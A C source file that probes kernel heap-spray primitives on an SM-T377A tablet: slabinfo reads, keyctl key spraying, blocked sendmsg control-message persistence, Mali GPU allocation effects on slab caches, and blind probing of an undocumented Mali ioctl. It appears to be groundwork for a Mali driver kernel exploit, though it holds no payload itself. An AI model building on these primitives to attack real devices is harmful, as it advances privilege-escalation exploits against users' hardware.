/*
 * heap_primitives.c — test heap spray primitives available on SM-T377A
 * Check: /proc/slabinfo, keyctl, sendmsg persistence, Mali slab usage
 */
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <unistd.h>
#include <pthread.h>

/* Mali helpers */
struct uk_header { uint32_t id; uint32_t ret; };
static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static uint64_t mali_alloc(int fd, uint32_t pages, uint32_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8) = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint32_t*)(buf + 32) = flags;
    if (ioctl(fd, make_cmd(56), buf) < 0) return 0;
    uint32_t result = ((struct uk_header*)buf)->id;
    if (result != 0) return 0;
    return *(uint64_t*)(buf + 40);
}

static int mali_free(int fd, uint64_t va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = va;
    return ioctl(fd, make_cmd(16), buf);
}

/* Keyctl syscall numbers for ARM */
#define __NR_add_key    309
#define __NR_keyctl     311

#define KEYCTL_REVOKE   3
#define KEYCTL_UNLINK   9
#define KEY_SPEC_PROCESS_KEYRING -2

static void dump_slab_line(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return;
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, name))
            printf("  %s", line);
    }
    fclose(f);
}

static void dump_slab_diff(const char *label) {
    printf("\n[%s] Key slabs:\n", label);
    dump_slab_line("kmalloc-64");
    dump_slab_line("kmalloc-128");
    dump_slab_line("kmalloc-192");
    dump_slab_line("kmalloc-256");
    dump_slab_line("kbase");
    dump_slab_line("mali");
    dump_slab_line("ion");
}

static volatile int sendmsg_done = 0;

static void *sendmsg_thread(void *arg) {
    int *fds = (int*)arg;
    int sock = fds[0];

    /* Create cmsg data targeting kmalloc-64 */
    char buf[1] = {'A'};
    struct iovec iov = { .iov_base = buf, .iov_len = 1 };

    /* cmsg of 48 bytes payload → total ~60 bytes → kmalloc-64 */
    char cmsg_buf[CMSG_SPACE(48)];
    memset(cmsg_buf, 0x41, sizeof(cmsg_buf));

    struct msghdr msg = {0};
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int*)CMSG_DATA(cmsg) = 0; /* dummy fd */

    int r = sendmsg(sock, &msg, 0);
    sendmsg_done = 1;
    return (void*)(long)r;
}

int main(void) {
    printf("=== Heap Primitives Probe ===\n");

    /* TEST 1: /proc/slabinfo access */
    printf("\n--- TEST 1: /proc/slabinfo access ---\n");
    FILE *f = fopen("/proc/slabinfo", "r");
    if (f) {
        printf("[+] /proc/slabinfo readable!\n");
        char line[512];
        int count = 0;
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "kbase") || strstr(line, "mali") ||
                strstr(line, "ion") || strstr(line, "kmalloc-64") ||
                strstr(line, "kmalloc-128") || strstr(line, "kmalloc-192"))
                printf("  %s", line);
            count++;
        }
        printf("  Total slab entries: %d\n", count);
        fclose(f);
    } else {
        printf("[-] /proc/slabinfo not readable: %s\n", strerror(errno));
    }

    /* TEST 2: keyctl availability */
    printf("\n--- TEST 2: keyctl syscall ---\n");
    {
        /* Try to add a 54-byte key (fits in kmalloc-64) */
        char payload[54];
        memset(payload, 0x42, 54);
        long key_id = syscall(__NR_add_key, "user", "test_key_1",
                             payload, sizeof(payload),
                             KEY_SPEC_PROCESS_KEYRING);
        if (key_id >= 0) {
            printf("[+] add_key succeeded: key_id=%ld\n", key_id);
            /* Try to revoke it */
            long r = syscall(__NR_keyctl, KEYCTL_REVOKE, key_id);
            printf("  keyctl(REVOKE): %ld (errno=%d)\n", r, r < 0 ? errno : 0);
        } else {
            printf("[-] add_key failed: errno=%d (%s)\n", errno, strerror(errno));
            /* Try with different type */
            key_id = syscall(__NR_add_key, "keyring", "test_kr",
                            NULL, 0, KEY_SPEC_PROCESS_KEYRING);
            printf("  add_key(keyring): %ld (errno=%d)\n", key_id, errno);
        }
    }

    /* TEST 3: sendmsg cmsg persistence */
    printf("\n--- TEST 3: sendmsg cmsg persistence ---\n");
    {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
            printf("[+] socketpair created\n");
            /* Fill the socket buffer */
            char fill[4096];
            memset(fill, 'X', sizeof(fill));
            int total = 0;
            /* Set non-blocking to detect full */
            fcntl(sv[0], F_SETFL, O_NONBLOCK);
            while (send(sv[0], fill, sizeof(fill), MSG_DONTWAIT) > 0)
                total += 4096;
            printf("  Socket buffer filled: %d bytes\n", total);
            /* Now set back to blocking */
            fcntl(sv[0], F_SETFL, 0);

            /* Launch blocking sendmsg in thread */
            pthread_t tid;
            sendmsg_done = 0;
            pthread_create(&tid, NULL, sendmsg_thread, sv);
            usleep(100000); /* 100ms */
            printf("  sendmsg blocked: %s\n", sendmsg_done ? "NO (returned)" : "YES (still blocked)");

            /* Read some data to unblock */
            char drain[4096];
            recv(sv[1], drain, sizeof(drain), MSG_DONTWAIT);
            usleep(100000);
            printf("  After drain: sendmsg_done=%d\n", sendmsg_done);

            close(sv[0]);
            close(sv[1]);
            pthread_join(tid, NULL);
        } else {
            printf("[-] socketpair failed: %s\n", strerror(errno));
        }
    }

    /* TEST 4: Mali slab impact */
    printf("\n--- TEST 4: Mali alloc slab impact ---\n");
    {
        dump_slab_diff("Before Mali allocs");

        int mali_fd = mali_open_ctx();
        if (mali_fd >= 0) {
            uint64_t vas[50];
            int count = 0;
            for (int i = 0; i < 50; i++) {
                vas[i] = mali_alloc(mali_fd, 1, 0x0F);
                if (vas[i]) count++;
            }
            printf("\n  Allocated %d Mali regions\n", count);

            dump_slab_diff("After 50 Mali allocs");

            /* Free them all */
            for (int i = 0; i < 50; i++)
                if (vas[i]) mali_free(mali_fd, vas[i]);

            dump_slab_diff("After Mali free");
            close(mali_fd);
        }
    }

    /* TEST 5: /proc/slab_allocators */
    printf("\n--- TEST 5: /proc/slab_allocators ---\n");
    f = fopen("/proc/slab_allocators", "r");
    if (f) {
        printf("[+] /proc/slab_allocators readable\n");
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "kbase") || strstr(line, "mali"))
                printf("  %s", line);
        }
        fclose(f);
    } else {
        printf("[-] Not readable: %s\n", strerror(errno));
    }

    /* TEST 6: Function ID 521 probe */
    printf("\n--- TEST 6: Mali function 521 probe ---\n");
    {
        int mali_fd = mali_open_ctx();
        if (mali_fd >= 0) {
            /* Try different struct sizes */
            int sizes[] = { 8, 16, 24, 32, 40, 48, 56, 64 };
            for (int si = 0; si < 8; si++) {
                uint8_t buf[64];
                memset(buf, 0, 64);
                ((struct uk_header*)buf)->id = 521;
                int r = ioctl(mali_fd, make_cmd(sizes[si]), buf);
                uint32_t result = ((struct uk_header*)buf)->id;
                printf("  id=521 sz=%d: ioctl=%d(e=%d) result=%u\n",
                       sizes[si], r, r < 0 ? errno : 0, result);
                if (r >= 0 && result == 0) {
                    printf("  Response: ");
                    for (int j = 0; j < sizes[si]; j += 4)
                        printf("[%d]=0x%x ", j, *(uint32_t*)(buf+j));
                    printf("\n");
                }
            }
            close(mali_fd);
        }
    }

    printf("\n=== Done ===\n");
    return 0;
}
